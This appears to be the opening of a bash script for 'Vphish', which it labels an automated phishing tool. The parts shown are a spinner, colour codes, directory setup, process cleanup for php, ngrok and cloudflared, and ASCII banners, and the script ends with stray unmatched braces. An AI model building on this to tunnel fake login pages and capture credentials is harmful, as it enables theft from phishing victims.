#!/bin/bash

spin () {

local pid=$!
local delay=0.25
local spinner=( '█■■■■' '■█■■■' '■■█■■' '■■■█■' '■■■■█' )

while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do

for i in "${spinner[@]}"
do
	tput civis
	echo -ne "\033[34m\r[*] Please wait.........\e[33m[\033[32m$i\033[33m]\033[0m   ";
	sleep $delay
	printf "\b\b\b\b\b\b\b\b";
done
done
printf "   \b\b\b\b\b"
tput cnorm
printf "\e[1;33m [Done]\e[0m";
echo "";

}

##   Vphish 	: 	Automated Phishing Tool
##   Author 	: 	Viraj L R 
##   Version 	: 	1.0
##   Github 	: 	https://github.com/VirajLR

## If you Copy Then Give the credits :)


## ANSI colors (FG & BG)
RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')"  CYAN="$(printf '\033[36m')"  WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
REDBG="$(printf '\033[41m')"  GREENBG="$(printf '\033[42m')"  ORANGEBG="$(printf '\033[43m')"  BLUEBG="$(printf '\033[44m')"
MAGENTABG="$(printf '\033[45m')"  CYANBG="$(printf '\033[46m')"  WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
RESETBG="$(printf '\e[0m\n')"

## Directories
if [[ ! -d ".server" ]]; then
	mkdir -p ".server"
fi
if [[ -d ".server/www" ]]; then
	rm -rf ".server/www"
	mkdir -p ".server/www"
else
	mkdir -p ".server/www"
fi
if [[ -e ".cld.log" ]]; then
	rm -rf ".cld.log"
fi

## Script termination
exit_on_signal_SIGINT() {
    { printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Interrupted." 2>&1; reset_color; }
    exit 0
}

exit_on_signal_SIGTERM() {
    { printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Terminated." 2>&1; reset_color; }
    exit 0
}

trap exit_on_signal_SIGINT SIGINT
trap exit_on_signal_SIGTERM SIGTERM

## Reset terminal colors
reset_color() {
	tput sgr0   # reset attributes
	tput op     # reset color
    return
}

## Kill already running process
kill_pid() {
	if [[ `pidof php` ]]; then
		killall php > /dev/null 2>&1
	fi
	if [[ `pidof ngrok` ]]; then
		killall ngrok > /dev/null 2>&1&> /dev/null & spin
	fi
	if [[ `pidof cloudflared` ]]; then
		killall cloudflared > /dev/null 2>&1&> /dev/null & spin
	fi
}


## Banner
banner() {
	cat <<- EOF
		${RED}
		${RED}   ..      ..${WHITE}       _     _     _               
		${RED}   \ \    / /${WHITE}      | |   (_)   | |              
		${RED}    \ \  / / ${WHITE} _ __ | |__  _ ___| |__  
		${RED}     \ \/ /  ${WHITE}| '_ \| '_ \| / __| '_  \ 
		${RED}      \  /   ${WHITE}| |_) | | | | \__ \ | | |   
		${RED}       \/    ${WHITE}| .__/|_| |_|_|___/_| |_|  
		${RED}             ${WHITE}| |                                
		${RED}             ${WHITE}|_|                ${RED}Version : 1.0

		${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Powered By Viraj LR${WHITE}
	EOF
}

## Small Banner
banner_small() {
	cat <<- EOF
		${BLUE}
		${BLUE}  ░█░░░█░█▀█░█░█░▀█▀░█▀▀░█░█░
		${BLUE}  ░░▄ ▄░░█▀▀░█▀█░░█░░▀▀█░█▀█░
		${BLUE}  ░░░▄░░░▀░░░▀░▀░▀▀▀░▀▀▀░▀░▀░${WHITE} 1.0
	EOF
}

}
}
